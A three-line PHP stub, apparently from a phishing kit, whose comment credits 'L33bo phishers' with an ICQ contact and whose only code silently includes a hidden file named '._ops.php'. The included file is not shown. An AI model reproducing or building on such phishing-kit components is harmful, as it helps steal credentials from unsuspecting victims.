<?php
/*
||| L33bo phishers = ICQ: 695059760
*/

@require_once "._ops.php";

?>